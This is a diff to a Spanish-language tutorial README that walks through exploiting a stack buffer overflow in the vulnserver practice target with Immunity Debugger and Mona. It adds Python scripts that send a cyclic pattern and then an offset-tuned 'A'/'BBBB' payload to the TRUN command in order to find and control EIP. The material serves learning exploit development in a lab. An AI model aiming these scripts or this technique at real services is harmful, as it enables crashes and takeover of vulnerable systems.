@@ -30,6 +30,7 @@ Este repositorio sirve como explicación y aplicación de metodología y anális
   * [7.1. Fuzzing](#step7-1)
   * [7.1.1 Fuzzing con Immunity Debugger](#step7-1-1)
 * [7.2. Descubriendo el offset del registro EIP](#step7-2)
+* [7.3. Controlando el registro EIP](#step7-3)
 	
 ---
 ---
@@ -142,6 +143,14 @@ git clone https://github.com/corelan/mona.git
 - Abrir Immunity Debugger como administrador y ejecutar el comando '**!mona**' en la barra inferior para comprobar que está bien importado. Se mostrará el manual de ayuda.
 
 <img width="1914" height="1032" alt="image" src="https://github.com/user-attachments/assets/cfcb9822-5c0f-4332-85be-febb04a73d3c" />
+
+Con el comando: 
+
+```!mona config -set workingfolder C:\mona\%p```
+
+todo lo que se vaya generando con Mona se guarda en una carpeta establecida en la ruta que se prefiera. 
+
+<img width="819" height="107" alt="image" src="https://github.com/user-attachments/assets/e6450ece-4ef4-4607-8f53-018066f5fced" />
 
 ---
 
@@ -434,7 +443,7 @@ En la ventana del dump de memoria se muestran las direcciones de memoria y su co
 
 ### ***¿Qué ha pasado?***
 
-Se ha producido un **buffer overflow**. Al enviar una cadena larga (≈2200 bytes) el programa escribió más datos de los que esperaba en una zona de memoria (el búfer) y sobrescribió datos contiguos del stack, incluidos EBP y EIP. Cuando un búfer en el stack se desborda los bytes extras pueden acabar sobrescribiendo primero variables locales, luego registros como EBP y EIP.
+Se ha producido un **buffer overflow**. Al enviar una cadena larga (≈2200 bytes) el programa escribió más datos de los que esperaba en una zona de memoria (el búfer) y sobrescribió datos contiguos del stack, incluidos EBP y EIP. Cuando un búfer en el stack se desborda los bytes extras pueden acabar sobrescribiendo primero variables locales, luego registros como EBP y EIP. Esto ha ocurrido al envío de 2200 bytes.
 
 Al sobrescribir el registro EIP con 0x41414141 la ejecución intentó saltar a la dirección 0x41414141 y se produjo el crash debido a que dejó de seguir el flujo del programa y saltar a la siguiente instrucción. Como 0x41414141 no apunta a memoria válida/ejecutable, se produce una excepción y por ende un crash.
 
@@ -448,27 +457,200 @@ Hay que recordar que se han estado enviando cadenas muy largas con 'A's al hacer
 
 Los registros de 32 bits (EAX, EIP, EBP, ESP...) almacenan 4 bytes, así que si se cargan cuatro 'A's en la pila, el registro toma esos bytes, aparecerá 0x41414141.
 
+---
+
 <a name="step7-2"></a>
 
-### ⌨️ ***7.2. Descubriendo el offset del registro EIP***
+### 🧾 ***7.2. Descubriendo el offset del registro EIP***
 
-Una vez identificado y analizado el crash del programa el siguiente paso es identificar la longitud de la entrada a enviar a vulnserver para poder sobreescribir el registro EIP y hacerse así con el flujo de control. Es decir cuántas A hay que enviar antes de escribir los 4 bytes que acabarán en el registro EIP.
+Una vez identificado y analizado el crash del programa el siguiente paso es identificar la longitud de la entrada a enviar a vulnserver para poder sobreescribir el registro EIP y hacerse así con el flujo de control. Es decir cuántas A hay que enviar antes de escribir los 4 bytes que acabarán en el registro EIP y poder controlar la dirección de retorno.
 
-El offset es el número de bytes desde el inicio del buffer (la primera posición donde se copió el input) hasta el lugar donde se sobrescribe el registro EIP (los 4 bytes que controlan la dirección de ejecución).
+El offset es el número de bytes desde el inicio del búfer (la primera posición donde se copió el input) hasta el lugar donde se sobrescribe el registro EIP (los 4 bytes que controlan la dirección de ejecución).
 
+En este caso se trabaja con la herramienta Mona. Para ver los logs de Mona ir a View -> Log y en la barra de comandos: ```!mona```
 
+Los comandos _findmsp_ , _pattern_offset_ y _pattern_create_ generan y analizan patrones para calcular la cantidad exacta de bytes necesarios para alcanzar y sobrescribir EIP.
 
+**1. Comando _pattern_create_:** crea un patrón cíclico de entrada de tamaño especificado en bytes.
 
+```
+!mona pattern_create 3000
+```
 
+<img width="1133" height="207" alt="image" src="https://github.com/user-attachments/assets/02fccc63-16af-433e-8415-2e9d50a7dc01" />
 
+Si el comando ha funcionado, y se ha configurado anteriormente que el resultado se guarde en un fichero de la carpeta especificada entonces aparecerá algo como esto:
 
+<img width="789" height="188" alt="image" src="https://github.com/user-attachments/assets/077aae4b-48df-4240-97a5-ffdf60b74f7e" />
 
+Y cuyo contenido será la información generada por el comando junto con el patrón creado en diferentes formatos:
 
+<img width="431" height="650" alt="image" src="https://github.com/user-attachments/assets/a08e6722-926c-44df-8d0a-1aa862495030" />
 
+Al ser un patrón cíclico se puede identificar en qué posición del patrón se sobrescribe el registro EIP para establecer cuanta información hay que enviar hasta sobrescribir la información de retorno.
 
+**2. Exploit y comando _pattern_offset_**:
 
+Con el programa reiniciado y corriendo en Immunity Debugger (en estado 'Running') el siguiente paso es la ejecución del siguiente exploit a través de una CMD.
 
+<details>
+<summary><b>Python Script EIP Offset Discovery</b></summary>
 
+```python
+
+import socket
+
+# Define the target server IP and Port
+target_ip = '127.0.0.1'
+target_port = 9999
+
+# Replace the pattern with the one created from Metasploit or Mona
+pattern = (
+	b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D'
+)
+
+# Command
+command = b'TRUN'
+command_magic = b' .'
+
+try:
+	# Create a socket object and connect to the server
+	print('Exploit> Connect to target')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+
+	# Receive the banner or welcome message from the server
+	banner = s.recv(1024).decode('utf-8')
+	print(f'Server> {banner}')
+
+	# Offset discovery
+	print(f'Exploit> Sending pattern to discover offset')
+	offset_discovery = command + command_magic + pattern
+	s.send(offset_discovery)
+
+	# Receive the response
+	print('Exploit> The target server is expected to crash. No response will be received.')
+	try:
+		response = s.recv(1024).decode('utf-8')
+		print(f'Server> {response}')
+	except Exception as e:
+		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')
+
+except Exception as e:
+	# Exception handling
+	print(f'An error occurred: {str(e)}')
+
+finally:
+	# Close the connection
+	s.close()
+
+```
+
+</details>
+
+Este exploit en Python se encarga de establecer una conexión TCP con vulnserver para enviar un payload con el patrón generado anteriormente.
+
+Al enviarse un payload de 3000 bytes se producirá de nuevo un crash del programa.
+
+<img width="419" height="590" alt="image" src="https://github.com/user-attachments/assets/6531579e-e540-4dad-903a-3179593ab00d" />
+
+En este caso el programa se queda bloqueado indicando una violación de acceso al ejecutar la instrucción de la dirección a la que apunta el registro EIP, la 396F4338 .
+
+<img width="425" height="21" alt="image" src="https://github.com/user-attachments/assets/ea9aa420-a743-4d25-a9a3-a0b95e428143" />
+
+Al ejecutar en Immunity Debugger el comando de Mona _pattern_offset_ con la dirección que marca el registro EIP:
+
+```
+!mona pattern_offset 396F4338
+```
+
+Obtenemos lo siguiente:
+
+<img width="635" height="206" alt="image" src="https://github.com/user-attachments/assets/9a9e5022-ab02-4752-9a2f-31c39252e478" />
+
+El comando ha encontrado el patrón 8Co9 de la dirección indicada anteriormente en la posición 2006.
+Esto quiere decir que el offset son 2006 bytes y que se pueden enviar 2006 'A's y después 4 'B's para observar que 2006 es la longitud hasta entrar o sobrescribir el EIP.
+
+**3. Comando _findmsp_:**
+
+De la misma manera que se ha ejecutado el anterior comando de Mona, también es posible hacerlo con _findmsp_ .
+
+```
+!mona findmsp
+```
+
+Como resultado se obtiene información sobre el offset de los registros y también se genera un fichero con toda la información recopilada con Mona al respecto.
+
+<img width="1084" height="301" alt="image" src="https://github.com/user-attachments/assets/b15e0ed5-636b-43e5-a1d9-bfe9066759f4" />
+
+---
+
+<img width="704" height="826" alt="image" src="https://github.com/user-attachments/assets/de15e88c-7261-41a9-ae16-fe4291c71902" />
+
+---
+
+<a name="step7-3"></a>
+
+### 🛃 ***7.3. Controlando el registro EIP***
+
+Una vez identificado el offset (2006 bytes) se puede modificar la entrada para sobrescribir EIP y confirmar el control de la ejecución.
+
+Por ejemplo, reemplazar EIP por 0x42424242 (que representa 'BBBB' en ASCII) es una forma común de verificar que el registro se ha sobrescrito correctamente.
+
+En este caso se hace uso del siguiente script en Python.
+
+<details>
+<summary><b>Python Script Control EIP</b></summary>
+
+```python
+
+import socket
+
+# Define the target server IP and Port
+target_ip = '127.0.0.1'
+target_port = 9999
+
+# 2006 'A's followed by 'BBBB' to check EIP control
+buffer = b'A' * 2006 + b'BBBB'
+
+# Command
+command = b'TRUN'
+command_magic = b' .'
+
+try:
+	# Create a socket object and connect to the server
+	print('Exploit> Connect to target')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+
+	# Receive the banner or welcome message from the server
+	banner = s.recv(1024).decode('utf-8')
+	print(f'Server> {banner}')
+
+	# Control EIP
+	print(f'Exploit> Sending buffer to overflow EIP')
+	control_eip = command + command_magic + buffer
+	s.send(control_eip)
+
+	# Receive the response
+	print('Exploit> The target server is expected to crash. No response will be received.')
+	try:
+		response = s.recv(1024).decode('utf-8')
+		print(f'Server> {response}')
+	except Exception as e:
+		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')
+
+except Exception as e:
+	# Exception handling
+	print(f'An error occurred: {str(e)}')
+
+finally:
+	# Close the connection
+	s.close()
+
+```
+
+</details>
 
 
 
